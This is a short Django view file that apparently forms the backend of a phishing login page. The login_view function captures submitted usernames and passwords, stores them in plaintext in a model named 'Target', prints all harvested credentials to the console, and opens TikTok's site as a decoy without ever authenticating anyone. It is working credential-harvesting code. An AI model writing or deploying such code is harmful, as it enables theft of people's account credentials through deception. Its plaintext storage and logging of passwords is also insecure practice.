from django.shortcuts import render
from .forms import LoginForm
# Create your views here.
from .models import Target
from django.http import HttpResponseRedirect
import webbrowser
def login_view(request):
    form = LoginForm(request.POST or None)
    if request.method == "POST":
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            Target.objects.create(username=username, password=password)
            for i in Target.objects.all():
                print(i.username, i.password)
            print("username-",username)
            print("password-",password)
            webbrowser.open("https://www.tiktok.com/en/")
            # return HttpResponseRedirect("youtube.com")

    return render(request, "index.html", {'form': form})